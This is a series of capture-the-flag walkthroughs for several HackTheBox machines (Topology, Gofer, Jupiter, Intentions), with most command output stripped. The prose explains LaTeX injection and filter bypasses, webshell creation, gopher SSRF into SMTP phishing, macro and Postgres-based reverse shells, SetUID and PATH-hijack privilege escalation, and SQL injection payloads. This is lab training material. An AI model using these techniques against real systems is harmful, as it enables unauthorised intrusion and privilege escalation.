The steps the researcher lays out are as follows, and work with some modification:
I’ll shorten this a bit:
The nginx config looks a lot like before, but this time with an error_log defined (and a new port since nginx is still listening on others):
I’ll start that nginx server:
Now there’s a server listening on 1339 that writes error logs to /etc/ld.so.preload.
Now I’ll request /tmp/pwn.so. The first request looks like a normal 404:
It’s important that the library not exist yet, or it won’t error and thus won’t write the log. If I run curl again, I’ll see errors:
That’s because curl is trying to load a bunch of things as shared objects from ld.so.preload that aren’t shared objects. This is clear in /etc/ld.so.preload:
Now any command will try to load a bunch of junk, but also /tmp/pwn.so.
I’ll make a copy of bash to mess with:
I’ll write the following to /tmp/pwn.c:
This will be the shared library, and on being loaded, it will change the bash executable I just copied to be owned by root and have the SetUID bit on. Compiling this throws a warning, but it makes the file:
Now I just need to run something that starts as root. sudo -l will work nicely:
It fails to load a bunch of shared objects, but if it loaded pwn.so, then /tmp/rootshell should be SetUID and SetGID now. It is:
Running it with -p returns a root shell:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 10 Jun 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.091s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 focal.
The site is for a mathematics department at a university:
All of the links on the page except one are just to this same page. The one is for the “LaTeX Equation Generator”, which points at latex.topology.htb/equation.php. There’s an email address (lklein@topology.htb) that also uses the topology.htb domain. I’ll want to fuzz the site for subdomains.
The HTTP response headers don’t show anything beyond Apache:
The 404 page is the Apache 404 page as well:
Guessing at extensions for the index page, it loads as index.html. This site is looking very static.
I’ll run feroxbuster against the site, and include -x html since I’ve seen that extension:
Nothing interesting here.
Given the use of subdomains, I’ll use ffuf to brute force others to see if it changes the response from the site:
It finds stats and dev. I’ll add these along with the latex one from the link in the page to my local /etc/hosts file:
Visiting this page pops HTTP basic auth:
I’ll try admin / admin, but it doesn’t work.
This page has a broken image and a graph image:
The images load out of /files, which has listing enabled:
network.png is present, but 0 bytes. That’s weird. I’ll also note that the time stamps are from this minute. Something must be updating them.
The tech stack seems the same, and feroxbuster doesn’t find anything interesting.
I’ll look at the broken image in Beyond Root.
The root for this virtual host is just a directory listing:
equation.php is the page linked to from the main site. It has a LaTeX Equation Generator page:
LaTeX is a language for writing code the converts to mathematical glyphs.
Submitting one of the examples (\frac{x+5}{y-3}) returns a PNG image of the result:
equationtest.tex is a LateX file, likely used for testing:
\input{header} imports the header.tex file:
The listings package seems interesting as it can “include” (presumably read) files.

Category: Shell as vdaisley
The HackTricks page on LaTeX injection has a bunch of methods for getting file read and execution. The most basic is the \write18{command} construct, which I showed back on Chaos. If I try to send something like \write18{id} via the form in the page above, it returns an error:
It’s interesting that the error message comes back in the PNG. This makes it hard to fuzz (though not impossible). Other methods like \input{/etc/passwd} and trying to write a file with \write also get blocked. Ippsec came up with a very clever idea for bypassing this filter. I’ll go into this and unintended solutions in Beyond Root.
This page documents the listings package, where the “Importing code from a file” section is of interest. Something like \lstinputlisting{filename} will include an image of the content of that file.
Submitting \lstinputlisting{/etc/passwd} fails:
Looking in Burp, it is returning an empty response. The page says:
Please enter LaTeX inline math mode syntax in the text field (only oneliners supported at the moment).
This tex stackexchange answer says that for in-line mode, the equation is enclosed between $ characters. So presumably the site is adding $ before and after my input. I need to break out of those, so I’ll put them before and after, like $\lstinputlisting{/etc/passwd}$. It works:
With file read, one useful thing to look at is the Apache configuration. The default location is /etc/apache2/sites-enabled/000-default.conf
This shows four hosts, all with admin email of vdaisley@topology.htb:
There’s not much going on with any of the servers.
The dev site required auth. Typically on Apache if the site password isn’t configured in the server config, it’s configured via an .htaccess file. Reading /var/www/dev/.htaccess returns:
The AuthUserFile defines that access. Reading /var/www/dev/.htpasswd shows the hash:
I’ll use an online OCR site to get this most of the way, checking each character manually to make sure it’s correct:
I’ll feed this into hashcat and it cracks immediately:
The password is “calculus20”.
That gets me into the dev.topology.htb site.
The site is about software developed by the staff from the university:
There’s nothing too interesting here. The only links go back to latex.topology.htb.
The same creds do with for vdaisley over SSH:
And grab user.txt:

Category: Shell as root
vdaisley’s home directory is very empty:
There are no other directories in /home.
/opt has an interesting folder, but vdaisley can’t access it:
However, vdaisley can write in this directory:
ps auxww doesn’t show anything that jumps out as super interesting to me. I’ll grab a copy of pspy from GitHub, host it on my VM in a web-accessible directory, and upload it to Topology with wget:
I’ll set it as executable and run it:
On the minute, there’s a set of processes that show up:
The first four lines are just CRON starting. What’s interesting comes next - it is calling /opt/gnuplot/getdata.sh, which is using find to get all .plt files from /opt/gnuplot and passes them to gnuplot!
I can write to /opt/gnuplot and any .plt file in that directory will get run each minute. In theory, if I can run a script from a .plt (which it looks like may be happening in the two files in there now), then I should be able to get arbitrary code execution.
To test this, I’ll write a simple .plt file using the system command, starting with something based on the example in these docs:
I’ll want to write the results somewhere. The docs for print say that the output file can be set with set print:
I’ll write that to a .plt file (using cat and << EOF to write until it gets a line with EOF):
When the next minute rolls over, the output file is there:
It executed as root.
I’ll update my .plt file to create a copy of bash owned by root with the SetUID/SetGID bits on:
Next minute, the file is there, and the user and group execute permissions are s, showing that it worked:
I’ll run that with -p to not drop privs, and get a shell as root:
And read the second flag:
The PHP on the site that handles the LaTeX is in equation.php. Submitting the form generates a GET request to a URL like:
Looking at the source as root, if eqn is set, then it runs this code to filter the input:
If the input contains any of a bunch of potentially dangerous strings or is too long, it replaces the input with the error message. That explains why the error comes back as a PNG.
It then adds a header to the input:
Next it gets a random filename in the tempfiles directory and write the LaTeX template to it:
It runs pdflatex on the new file, and then converts the output to a PNG with convert (part of ImageMagick):
It opens the PNG and sends it back to the requester:
And does some cleanup:
Ippsec was reading this blog post about bypassing LaTeX filters where it talks about a bypass using the \catcode directive:
To start, it sets the “@” character to represent superscript values. We use two of them to tell LaTeX to use the hex value that follows after.
His thought was to just use ^ and see if that works, and it does! We tried something like \input, and it goes from blocked to crashing:
This isn’t execution, but it is bypassing the filter. What does work is \write. On it’s own, it’s blocked:
But replace the “w” with “^^77” and it gets through.
To write a file, I’ll need a few LaTeX commands:
To send those to Topology, I initially tried ; as a separator, but no separator at all works as well:
When I send this, the resulting PNG is empty:
Going over to latex.topology.htb/tempfiles, it’s there:
I’ll change the written text to a PHP webshell, and the output filename to cmd.php:
On reloading, cmd.php is there:
And using it as a webshell works for execution:
There was a patch after the initial release of this box as shown in this changelog:
I believe the original person to root solved by writing a webshell with \write (or a similar method like \begin{filecontent*}{shell.php}) and the patch was increasing the filter. But even that is bypassable using ^^.
I noted during enumeration that the timestamps for the images on the stats.topology.htb website were updating every minute. It really bugged me that one of the two images was returning empty. I’m going to figure out what’s going on.
I’ll start by looking at the crons being run by root:
There are three.
getdata.sh runs every minute:
The first line runs a netstat and gets some data out of it. It actually produces nothing. I’ll look at the netstat output:
That is piped into grep enp. But there is no enp interface! This probably existed when the author was developing, but then got broken when it imported to HackTheBox and the interface names changed. If I change that from “enp” to “eth”, it gives the RX-OK and TX-OK values, which are received and transmitted counts:
So is that why network.png is empty? Actually not. Each minute this result is appended to netdata.dat, so this just doesn’t change the file, which still has data:
The next command gets the “load average” value from uptime:
Then the script wants to get only the most recent 60 measurements for each file. It looks like the author played with using sed , but commented that out in favor of tail.
So while the netdata.dat file isn’t updating as expected, it should still have data to create an image.
The second cron is running gnuplot every minute to generate images with this command:  find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
That will find all files in /opt/gnuplot that end in .plt, and then execute gnuplot [file] on each.
The third cron runs every 10 minutes, as specified by */10 * * * * (crontab.guru is a nice resource for decoding this if it’s not familiar).
It runs a more complicated find:
It’s searching in the /opt/gnuplot directory for files that end in .plt, are at least 5 minutes old (-mmin +5) and less than 300 minutes old (-mmin 300). Any files that match are passed into rm -rf [file], so removed. This cron is just cleaning up user created .plt files.
I’ll start with loadplot.plt, as it seems to be working.
On the second line it sets the output file to within the webserver. Then it sets a bunch of style stuff. Finally it calls plot on loaddata.dat to generate the plot.
On first glance, networkplot.plt looks very similar:
It also sets the output file in the stats web directory. The issue is in the plot command. It’s trying to load netdata.dat from the wrong directory!
This error can also be seen by running gnuplot:
The file is immutable, so even root can’t edit it:
I’ll unset that:
Now I can change “esp” to “eth” so new data will start flowing:
It works:
In this one, I just need to change two instances of /var/www to /opt on the last line:
Now running gnuplot networkplot.plt runs without error.
Now refreshing the website shows two plots:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 29 Jul 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.091s latency).
Not shown: 65530 closed ports
PORT    STATE    SERVICE
22/tcp  open     ssh
25/tcp  filtered smtp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-dsCategory: Recon
nmap finds four open TCP ports, SSH (22), HTTP (80), netbois (139), and SMB (445), as well as a filtered SMTP port (25):
Based on the OpenSSH and Apache versions, the host is likely running Debian 11 bullseye. I’ll note the clock is off from mine by 16 hours.
There’s a redirect on port 80 to gofer.htb.
I’ll want to check on the SMTP port once I get more access.
Interestingly, netexec (the latest open-source fork of crackmapexec) thinks this is a Windows host:
It gives the domains gofer.htb. Without auth, it’s unable to access any information about the shares:
With fake creds, it complains about the domain:
If I update the domain as suggested, it works:
-N does work nicely for this kind of auth with smbclient:
There’s a single .backup folder in the share:
It has a file named mail, which I’ll grab:
The file is a single email:
There are some take-aways in this email:
Given the redirect to the hostname, I’ll check for any subdomains that return a different result via virtual host routing with ffuf. I like to use -mc all to get all response codes and -ac to automatically filter results to just show ones that are different than the default case:
#www and #mail seem like false positives, but proxy is interesting. That matches the mention of the proxy in the mail above. I’ll add both of these to my /etc/hosts file:
The site is for a website design firm:
All of the links go to other places on the same page. There’s a list of the employees and their names / roles:
The email addresses map to these names nicely. There’s also an email info@gofer.htb by the “contact” form. Trying to submit the form just results in an error:
It’s not set up to work.
The HTTP response headers show Apache and not much else:
The main page loads as index.html, suggesting this is just a static site. If I try index.php, it returns a 404:
That’s the standard Apache 404 page.
The page source doesn’t have anything else interesting.
I’ll brute force paths on the server with feroxbuster, giving it -x html to try HTML extensions as well.:
Nothing interesting.
Visiting proxy.gofer.htb returns a pop for HTTP basic auth (which matches the 401 response shown by ffuf):
A couple quick guesses don’t get anywhere.
The HTTP response headers don’t show anything here either:
Anything I try to access gets the same auth response. That’s likely happening at the Apache level before it reaches the server.
I’ll try feroxbuster here as well, and it finds nothing:

Category: Shell as jhudson
I’ll come back to feroxbuster again with two additional changes:
Very quickly it shows that POST, PUT, and OPTIONS all return 200 for index.php with a 81 character response. It seems that the block is on the GET method!
I’ll send the GET request for the page over to Burp Repeater and change the method to POST. It returns an error message:
Given that this is a POST request, I’ll try including url there:
Still missing. It must be reading from $_GET["url"] or the parameter must not be url. I’ll try it as a GET parameter, and it works:
I don’t get the CSS or other stuff, but the page loads!
I’ll try to reach my own server:
It returns an error, but that’s because there’s no file ssrf on my server:
At this point, it’s not immediately clear what this would buy me, other than showing that I can issue requests. I am curious to know what is making the requests, but if I listen with nc and catch the request, there’s no User Agent header:
I didn’t run into this issue because I used gofer.htb to reference the box, and that is in the box’s hosts files, so it resolves. However, one challenge that’s intended to be bypassed happens if I try to access localhost or 127.0.0.1:
There’s a bunch of ways around this. 0.0.0.0 works. I already noted that gofer.htb works. Interestingly, 2130706433 doesn’t work, I suspect because it returns a 301 redirect to gofer.htb which the proxy doesn’t know how to parse.
If I try to read a file, I’ll also run into that blocklist:
SMTP is blocked as well. I could do some fuzzing from here, but the thing I need to know is clear from the name of the box. Gopher is not blocked:
I’ll look at the blocklist in Beyond Root.
Gopher is a protocol designed for interacting with documents over IP networks. It was an alternative to HTTP when the internet first came into being, and practically isn’t used anymore.
What’s cool about the gopher while hacking is that it doesn’t use headers or even newlines as part of the protocol.  I’ll include a single character after the /, and then the rest of the URL is considered the raw payload. For example, if I access the following URL:
What reached my nc is:
I can try to add newlines with %0d%0a, but it doesn’t work. However, a second URL encode does. So:
Leads to:
This means I can effectively interact with whatever service I want using GET requests. I’ve shown examples of Gopher in the past with Travel (interacting with memcache), Laser (sending a Solr exploit), and Jarmis (exploiting OMIGod).
I know from the clues before that I want to interact with SMTP on 25. The SMTP protocol has some basic commands for interacting. I’ve shown interacting with it over telnet or nc before (for example in Attended).
The simplest command is QUIT, which ends the session. I’ll try sending that, followed by a newline:
The response shows the banner and then the Bye message. That was a successful connection.
To send a full email to Jocelyn, I’ll need to work through what it will look like to get something like this:
That encodes by replacing the spaces with %20 and the newlines with %250d%250a:
And it works, queuing the email to send.
Less than a minute later, there’s a click on the link:
I’ve shown phishing with LibreOffice documents before. In RE, I made an .ods (equivalent of Excel for LibreOffice) file with a macro to run on opening, and it needed to avoid some Yara filters detecting Metasploit payloads. In Rabbit, I created a .odt file for an OpenOffice target (OpenOffice and LibreOffice are very similar, and use the same file extensions).
I’ll open LibreOffice Writer (like Word) and put some dummy text into the document:
And save it as report.odt.
I’ll open the “Organize Macros > Basic” menu:
Here, I’ll find my document, and under “Standard”, click, and select the “New” button:
This pops a dialog asking for a name, and then opens the macro editor:
I’ll add a simple reverse shell:
To get this to run automatically on opening, I’ll close the Macro editor and in the document window go to “Tools” > “Customize”. In the window that opens, I’ll go to the “Events” tab, click on “Open Document” and then “Macro…”:
I’ll select “Module1” and “Main”, and click ok:
It shows under “Assigned Action”:
I’ll save and close the document.
I’ll update the link in my email and send it again:
There’s a request for the document at my server:
And then a reverse shell at listening nc as jhudson:
I’ll upgrade my shell with the standard trick:
And read user.txt:

Category: Shell as tbuckley
The OS is Debian bullseye as suspected:
Neither sudo nor doas seem to be on Gofer (the file in completions is a Bash script, not the sudo binary):
Looking for SetUID/SetGID binaries, one does jump out as unusual:
notes is owned by root, configured as SetUID and SetGID:
It’s only executable by members of the dev group.
The getcap binary is not in jhudson’s PATH, but it is on Gofer and executable by anyone (putting binaries in sbin and not having that in non-admin user’s PATH is common on Debian). Running it across the entire drive finds three results:
tcpdump is very interesting!
This means that any user can sniff packets.
jhudson is in the netdev group:
I suspect tcpdump is supposed to only be executable by that group (would add to the realism of the box), but that got dropped at some point in VM creation / testing.
Because jhudson is not in dev, this user can’t run notes. The only user in dev is tbuckley:
I’ll have to come back to that when I get access to tbuckley.
The /etc/apache2/sites-enabled folder will have the configurations for the various web servers. There’s only one file, 000-default.conf. With the comments removed, there are two servers. The first is the main site:
There’s a rewrite rule that redirects to gofer.htb if that’s not the host. And it hosts files from /var/www/html, which has only a static index.html file and an assets folder. Nothing interesting there.
The second virtual host is the proxy:
It hosts from /var/www/proxy (which only has a single file, index.php). The most interesting part is the auth configuration, which says the password hash is stored in /etc/apache2/.htpasswd.
I’ll try taking that hash to HashCat for cracking, but it doesn’t crack.
To get a feel for what TCP traffic I can sniff, I’ll run the following tcpdump arguments:
Within a minute, there’s traffic:
There are two ports contacted - someone on localhost talking to port 80, and someone on local host talking to 631 (cups printing service).
ChatGPT helped me write this tcpdump command to just see GET request data, and it works:
There’s two GET requests there. First to proxy.gofer.htb requesting gofer.htb, and then to gofer.htb. The first one has the Authorization header, which is just the base64-encoded username then colon then password:
That password for tbuckley works as the password for the user on Gofer as well:
It also works over SSH:

Category: Shell as root
At this point, there isn’t much enumeration needed, as I now have access to a SetUID/SetGID binary running as root. This seems like the clear path forward. I’m going to show exploiting this binary without opening it in Ghidra or gdb, but rather just playing with it, as I initially solved this. I’ll do some reversing in Beyond Root.
I always want to start with playing with the intended functionality of the application before trying to hack it.
Running notes presents a menu:
1 prompt for user name:
And then re-print the menu. 2 shows that result:
There’s some kind of role attached here. If I quit and try to run 2 before 1, it doesn’t work:
3 (delete) has no output, just reprints the menu. Running 2 now doesn’t error, but shows an empty username:
That’s weird, and potentially an issue.
4 offers a chance to create a note:
Assuming I have a valid user (not like shown above), this doesn’t impact the user, and the note prints back with 5:
Only part of the note prints. If I enter a different note, it just crashes the program:
6 is not implemented. If I run 7 to delete a note, then 5 shows (null):
If I try to run 8, it rejects the choice because I don’t have the admin role:
While I can reverse this binary, I actually stumbled across some overflows accidentally while playing with the intended functionality.
I created a user, and then deleted it. Then I’ll move on to creating a note:
Now when I view my user (2), it’s overwritten:
My guess here is that either these are stored on the stack in fixed buffers that are overflowable, or they are on the heap and the username pointer is not-nulled when the buffer is free. So if my note is too long and not checked, it overwrites into the username and role.
This doesn’t happen if the user isn’t deleted, so there must be some check for an active user before allowing the write.
To understand where exactly the overflow is happening, I’ll use the pattern_create utility from Metasploit:
I’ll start the program, create a user, delete the user, and then create a note with that pattern as the body. Then on viewing the user data:
The username now matches the note exactly! And the roles starts 24 bytes in:
To get admin, I’ll again delete the user (3), then add a note with 24 bytes of anything, and then “admin”:
Now it says I have admin:
And if I enter 8, it says “Access granted!” before erroring out:
/opt/notes/ is empty.
The error seems to have an issue with tar. I’ll run strings on the binary to see if the command is in there, and it is:
The good news for me is that it is calling tar without a full path, which means I can likely hijack tar.
I’ll go into /dev/shm and create my own tar file:
This literally just drops into an interactive Bash shell. I’ll make sure to make tar executable.
I’ll update my $PATH variable for my current session:
Now the current directory is the first item in the path.
From here, it’s just running the following steps:
It works:
I can grab root.txt:
I actually love binary exploitation that doesn’t rely on looking at assembly. It’s a really fun and beginner accessible way to show binary exploitation. That said, it’s still worth looking at this binary in assembly. I’ll download a copy and fire up Ghidra in this video:
Interestingly, the entire binary is basically one function. It has two variables that store pointers, both of which are initialized to null. When a user is created, memory from the heap is requested and the first pointer is set pointing to it. When a user is deleted, that memory is freed, but the pointer is not nulled. So when option two is called for user information, it prints out whatever is in that buffer.
So when a user is created and then deleted, it leaves a pointer to freed memory - the definition of a use after free vulnerability. Then when I create a note, the heap returns the same buffer, so now both the note pointer and the name pointer point to the note. If I set the role in that buffer, when it’s checked later it matches. Details in the video!
It is possible to trigger a block list in index.php on the proxy site. The directory has only a single PHP file:
The page starts with the comment I saw in the responses, followed by the is_blacklisted function:
It seems to block “localhost”, “127”, and then a ton of possible schemes. This is not a very interesting or realistic filter, but it makes for an interesting challenge.
The rest of the page uses curl to make a query to the value of the URL parameters (if it’s not blocklisted), and then returns the result.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 03 Jun 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.098s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
The web service on port 80 returns a redirect to jupiter.htb.
Given the use of domain names, I’ll fuzz the webserver with different Host headers to see if any return different from the default with ffuf:
-mc looks at all response codes and -ac does automatic filtering of default cases. It finds one, kiosk.jupiter.htb. I’ll add both to my /etc/hosts file:
The site is about space tourism and data analysis:
The pages linked to across the top lead to various .html pages with more text, but nothing that jumps out as interesting. There is an email, support@jupiter.htb, on contact.html.
The HTTP response headers don’t leak anything beyond nginx:
The main page is index.html, which matches the extension used on the other pages. There’s nothing interesting in the source, and the 404 page is the default nginx page.
At this point, this look like a static site.
I’ll run feroxbuster against the site, and include -x html as that’s what I’ve seen so far:
Not anything useful here.
This site gives a dashboard view of information about moons:
The logo at the top right is a Grafana logo, and the title of the page is “Moons - Dashboards - Grafana”. The menu offers some settings, but nothing that I’m able to make interesting:

Category: Shell as postgres
Grafana does some weird stuff with HTTP requests. Loading / ends up at /d/jMgFGfA4z/moons?orgId=1&refresh=1d. Looking in Burp at the requests that are made to get there, there are many:
The /api/dashboards/home request returns the redirect to the moons page:
The /api/dashboards/uid/jMgFGfA4z returns sends back all the data for the dashboard:
There’s a ton in there. "type": "db" is interesting. It isn’t set to save, edit, admin, star, or delete. There’s a username, admin.
The next couple of requests return empty.
/api/ds/query is where it gets really interesting. The request looks like this:
The body pretty printed looks like:
It’s a post request containing a rawSql field! It even contains the type of DB, Postgres. The response looks like it has the results:
This is just the data for the dashboard.
It seems as if I can send raw Postgres queries into the database. I’ll send this request to Repeater and try editing the rawSql field to a simple select version():
It returns all the details. This has actually be raised as an issue on GitHub and the creator said it will be a long time before this is fixed! Someone on the thread calls this SQL injection, but it’s more like straight up raw SQL querying.
I can use this to enumerate the database, but there’s nothing really important there to find.
This post talks about turning Postgres queries into command execution, which was given the ID CVE-2019-9193. It’s not really a CVE as much as it is a feature that is easily abused.
The post outlines the following steps:
DROP TABLE IF EXISTS cmd_exec; - remove the cmd_exec table if it exists; this returns a results structure with no values.
CREATE TABLE cmd_exec(cmd_output text); - create a table to store command output in; this returns a results structure with no values.
COPY cmd_exec FROM PROGRAM 'id'; - get the results of the id command into the table; this returns a results structure with no values. It is important to get regularly single quotes, not the fancy once that copy out of the post.
SELECT * FROM cmd_exec; - display the results - this returns a results structure with a bunch of stuff, most importantly:
That’s RCE!
To get a shell, I don’t have to recreate the table or worry about the output. I’ll pull up the third command above and replace id with a bash reverse shell:
On sending this, I get a shell at nc:
I’ll upgrade my shell using the standard trick:

Category: Shell as juno
The postgres user’s home directory is in /var/lib/postgres, and doesn’t have much interesting.
There are two users on the box with directories in /home:
postgres can’t access either.
There’s an interesting directory in /opt, but postgres can’t access it, as it’s owned by jovian and in the science group:
There’s also a network-simulation.yml and shadow.data folder in /dev/shm:
I’ll come back to this shortly.
The output of ps auxww has one interesting line:
A Jupyter notebook running as jovian, with notebooks in the folder that I can’t access yet. I’ll have to come back to this.
To further look at the processes, I’ll use pspy to look for any crons. I’ll serve it with a Python webserver on my host, and upload it with wget, then setting it as executable:
I’ll run it, and watch for interesting programs, especially when the minute changes:
There’s a bunch of commands run as user id 1000 (juno) every two minutes:
It seems to be running shadow-simulation.sh and using the network-simulation.yml file from /dev/shm.
The Shadow Simulator is a network simulator the runs by executing real programs on Linux. I’ll take a look at the config file from /dev/shm that seems to be involved in the execution:
It’s creating a network with a single gigabyte switch, and then four hosts. The first is a server the runs a Python webserver after three seconds, and then three clients that use curl to request that page after five seconds.
It looks like this can run whatever programs I want it to run. I’ll update the network-simulation.yml file in /dev/shm:
I’ll just have it create a single server with two processes. The first will create a copy of bash in /tmp and the seconds will set it as SetUID/SetGID. Once the cron runs, /tmp/0xdf is there, owned by juno, SetUID/SetGID, and running it with -p gives a shell with effective uid and gid of juno:
I’m able to read user.txt:

Category: Shell as jovian
At this point, I’ve already noticed the Jupyter process running as the other user, jovian. I’ve also noted that the folder in /opt is in the science group.
Interesting, juno should also be a member of science:
When I get a shell as juno by running a SetUID and/or SetGID bash, it only brings in the effective userid and/or group id. It doesn’t bring in all the other groups that that user may belong to.
I’ll go into juno’s .ssh directory and add my public key to the authorized_keys file:
Now I can SSH in as juno:
This shell has the science group:
The /opt/solar-flares directory has a bunch of files related to a Jupyter Notebook:
The start.sh script starts the notebook in such a way that it logs everything into a log file named with the current date in the logs directory:
A Jupyter Notebook is a Python interactive webpage that runs Python code in a series of cells and displays the output. They are incredibly popular in the scientific community where people use them to do some coding without writing full on programs.
Rather than look at the raw Jupyter files, I’ll view the web interface, which typically runs on port 8888. There is a service running on 8888 only on localhost on Jupiter:
I’ll reconnect my SSH session with -L 8888:localhost:8888 to forward port 8888 on my VM through the SSH connection and to localhost:8888 on Jupiter.
On loading localhost:8888 in Firefox, it shows the page, asking for a password/token to get access:
The token is printed to the console when Jupyter is started. Since all of that is being logged to files, I’ll check those out:
The token is in the file. On entering that, it loads the Jupyter interface:
I’ll open up flares.ipynb, and it shows the notebook:
There’s some plots and stuff, but I’m interested in running Python commands.
I’ll add a cell at the bottom and type in some simple code:
With my cursor in that cell, Shift-Enter will run it:
I can work from that same cell, updating the code and using Shift-Enter to execute.
I’ll create a .ssh directory and write my public key into authorized_keys:
Now I can connect with SSH:

Category: Shell as root
jovian is able to run sattrack as root with sudo:
Running the program complains about a missing configuration file:
-h or --help don’t seem to change this output. I’ll run strace to see what it’s trying to load:
It’s always best to start at the bottom with strace. I’ll see it writes the header, and then tries to get file status on /tmp/config.json with newfstatat (man page). When that fails, it write the failure message.
There are a bunch of ways to get a valid config file. I’ll show three.
Given that I need a config.json file, why not see if one exists somewhere on Jupiter. The find command finds a good candidate:
The most fun way to solve this is to build the config file using error messages. I’ll start by creating /tmp/config.json:
It’s giving a parsing error. I’ll update to valid JSON:
Now it wants tleroot. I’ll add that, and just give it a blank value, since I don’t know what this is:
It’s failing trying to create a directory! I’ll give it a value to see if that works.
It claims to have created /tmp/0xdf-tleroot, and it did:
Now it wants updatePerdiod (note the typo in “period”), so I’ll add that, trying to represent a value like 10 seconds:
It wants an int:
Without knowing what station is, I’ll guess a string and see what happens:
Ah, ok. I’ll give it an object:
Did that work? I guess so. Moving on to name:
That didn’t work. Perhaps it wants the name as part of the station?
That worked! There’s a bunch more, but I’ll leave it here, as while this is kind of a fun challenge, it’s not necessary.
This software is a modified version of arftracksat, which is open source on GitHub. It’s not easy to find with the filename or banner, but once you get some feel for the config file, knowing it wants tleroot is enough to find it:
There’s an example config.json file there:
I’ll copy the config file from /usr/local/share and give this a run:
It hangs on each source, timing out unable to resolve each host. There’s an empty file for each in the TLE directory:
One way to abuse this is to use the file:// protocol handler.  I’ll replace the fetched URIs with attempts to read root.txt and an private SSH key:
When I run this, it gets root.txt, but no key:
Still, root.txt is in the tleroot directory:
One way to get a shell as root would be to write an SSH key into /root/.ssh/authorized_keys. I’ll host my public key in a file named authorized_keys on my webserver, and add that to the config. I’ll also set the tleroot to /root/.ssh so that it writes there:
When I run this, there’s a a hit at my webserver:
It reports that it got the file, but then complains that it wasn’t a valid file, likely because it isn’t formatted as expected.
Still, it must have written, as I can now log in as root over SSH:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 01 Jul 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.090s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
The website is for the “Intentions Image Gallery”, and the web root presents a login form:
After a couple quick checks for basic SQL injection and default creds, I’ll go to the register link, where it offers a form to create an account, which I’ll fill in:
On logging in, there’s a welcome message. On the Gallery tab, there are images, each with a genre:
“Your Feed” shows the same pictures, limited to the genres set in my profile, which looks like:
I can change the genres and click update, and the images in “Your Feed” reflect the change.
The HTTP response headers from my initial visit to the page don’t explicitly show any info about the framework:
That said, the two cookies that get set, XSRF-TOKEN and intentions_session, match the typical format seen from the Laravel PHP framework. The session cookie can be laravel_session (like in Extension), or renamed to match the app (like in EarlyAccess).
Corroborating this theory, visiting /index.php loads the same login page, and visiting a page that doesn’t exist shows the Laravel 404 page:
I’ll note that each of the image files are stored in /storage/[category]/, where [category] is a word such as “nature”, “food”, etc.
Digging around in the HTML source, I don’t find any additional hints about the framework, but there are two interesting includes that stand out:
Both these files are heavily obfuscated. I can come back to them and try to deobfuscate them if necessary, but it won’t be.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
/admin is interesting, but it returns a 302 redirect to the login page.
I’ll eventually come back and think about the interesting obfuscated JavaScript includes. It’s worth looking for any additional files that might be in /js/:
The most interesting one is admin.js. It too is heavily obfuscated, but there are some JSON objects at the bottom that have clear text strings:
The important bit of info is:
Hey team, I’ve deployed the v2 API to production and have started using it in the admin section. Let me know if you spot any bugs.
​                This will be a major security upgrade for our users, passwords no longer need to be transmitted to the server in clear text!
​                By hashing the password client side there is no risk to our users as BCrypt is basically uncrackable.
​                This should take care of the concerns raised by our users regarding our lack of HTTPS connection.
The v2 API also comes with some neat features we are testing that could allow users to apply cool effects to the images. I’ve included some examples on the image editing page, but feel free to browse all of the available effects for the module and suggest some
My attempts to login via the site are POST requests to /api/v1/login with my username and password in plain text.
It’s also worth noting for later that just below these messages, there’s a reference to imagick.php:

Category: Shell as www-data
I’ll play around a bit with the “Favorite Genres” input to see how it works. The default value is “food,travel,nature”. On changing it to “food,travel”, only food and travel images show up in the “Your Feed”. If I add a space to make it “food, travel”, the space seems to break things as only food images show.
Looking at the requests in Burp Proxy, visiting “Your Feed” issues a GET request to /api/v1/gallery/user/feed. The response is a JSON object with metadata about a list of images (including the full URL to that image):
If I set the genres to “0xdf”, then no images return. The HTTP response shows success, but with an empty list:
On seeing the gallery, it’s worth thinking about how the page works. The most complicated part would be how to generate the “Your Feed” section. It needs to get the user’s profile (presumably from a database), use the genres string to make a database query for images, splitting it on “,” and then building that query.
It seems like a reasonable place to check for SQL injection. I’ll change the genres to include a single quote. It saves just fine:
However, there are no images at “Your Feed”. Looking at the request, it’s a 500 error:
That’s a good sign that there’s an injection here.
To get a working injection, I’ll try to “fix” the injection query to get it working again while still having my injection. A simple first guess is setting genres to something like food,' or 1=1-- -. this still returns a 500 error.
The SQL query running on the server must look something like:
If that’s the case, then I would want my input to close both the single quote as well as the parenthesis, with something like food,') or 1=1;-- -.  That still errors.
I already noted above that having a space in the query might have been messing something up. Without knowing what it’s doing, I can try using comments instead of spaces, like this:
It’s important to switch from the -- - comment to #, as the former requires a space to make the comment, and I’m testing without spaces (--/**/- will not work).
With my genres set to that, “Your Feed” populates with images of genre animal, architecture, feed, nature, etc. This is successful injection, and it’s a second-order SQL injection because the query to one page that sets the injection is then manifested on another page when viewed.
To do a UNION injection, I’ll need to know the number of columns naturally returned from the query so I can UNION on that same number of columns of data to leak.
I’ll see from the data returned above that each image has at least six things returned (id, file, genre, created_at, udpated_at, and url), through url could be generated from file, so maybe only five items. I’ll try five like this: ')/**/UNION/**/SELECT/**/1,2,3,4,5#.
In Repeater, I’ll request the feed, and it returns exactly what I’m hoping for:
The input numbers one through five are in each of these columns, and the url is built from the file (as guessed).
